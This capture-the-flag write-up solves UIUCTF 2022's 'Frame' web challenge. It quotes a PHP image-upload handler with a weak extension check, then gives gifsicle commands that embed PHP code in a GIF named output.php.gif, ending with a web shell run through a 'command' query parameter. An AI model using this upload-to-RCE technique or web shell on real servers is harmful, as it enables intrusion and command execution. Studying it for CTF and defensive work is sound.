# UIUCTF 2022 (web)

## Frame

### [source](https://github.com/GiongfNef/ChallFile/blob/main/UIUCTF2022/frame/handout.tar)

![chall](<../.gitbook/assets/image (6).png>)

### Analysis

```
<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
          if (isset($_POST["submit"])) {
            $allowed_extensions = array(".jpg", ".jpeg", ".png", ".gif");
            $filename = $_FILES["fileToUpload"]["name"];
            $tmpname = $_FILES["fileToUpload"]["tmp_name"];
            $target_file = "uploads/" . bin2hex(random_bytes(8)) . "-" .basename($filename);

            $has_extension = false;
            foreach ($allowed_extensions as $extension) {
              if (strpos(strtolower($filename), $extension) !== false) {
                $has_extension = true;
              }
            }
            
            if ($_FILES["fileToUpload"]["size"] < 2000000) {
              if (getimagesize($tmpname) && $has_extension) {
                if (move_uploaded_file($tmpname, $target_file)) {     
                  echo "<div id='frame'><img src='$target_file' alt='Your image failed to load :(' id='submission'></div>";
                } else {
                  echo "There was an error uploading your file. Please contact an admin.";
                }
              } else {
                echo "Your picture is not a picture and could not be framed.";
              }
            } else {
              echo "Your picture is too large for us to process.";
            }
          }
        ?>
```

* know that: $allowed\_extensions = array(".jpg", ".jpeg", ".png", ".gif"); -> we can use ".gif" extension file. Finding around and i got [<mark style="color:blue;">`this doc`</mark>](https://doddsecurity.com/94/remote-code-execution-in-the-avatars/)<mark style="color:blue;">``</mark>
* We can use `gifsicle`  to embedd PHP code that runs the Linux command into a malicious image named output.php.gif.

### Exploit

#### First way

* Firstly, we convert png file that we received from chall to gif file
* I have tried change file extension from png to gif but it doesn't work, of course.

![](<../.gitbook/assets/image (3) (3).png>)

* I convert by [online tool](https://cloudconvert.com/png-to-gif) and ... that works. After we that just use this command:

```
gifsicle < frame-1.gif --comment "<?php system('id'); ?>" > output.php.gif
```

* Upload the output gif to server:

![the path of our requesting](<../.gitbook/assets/image (9).png>)

Go to that path and get some interesting things:

![](<../.gitbook/assets/image (1).png>)

* It works, try other commands to rce :

```
gifsicle < frame-1.gif --comment "<?php system('ls /'); ?>" > output.php.gif
```

![Here yah gooooo](<../.gitbook/assets/image (4).png>)

* Now just use rce command and got the flag:

```
gifsicle < frame-1.gif --comment "<?php system('cd / && cat flag'); ?>" > output.php.gif
```

![](<../.gitbook/assets/image (2) (1).png>)

flag in some confusing thing like this:

![](<../.gitbook/assets/image (1) (1) (2).png>)

#### Firstway but easier \~

```
gifsicle < frame-1.gif --comment '<?php echo system($_GET["command"]); ?>' > output.php.gif
```

Now we can rce ez by web shell

> /uploads/c654036b5974c786-output.php.gif?command=ls%20-a

![](<../.gitbook/assets/image (1) (1).png>)



Thanks for reading. Have a good day :heart: !
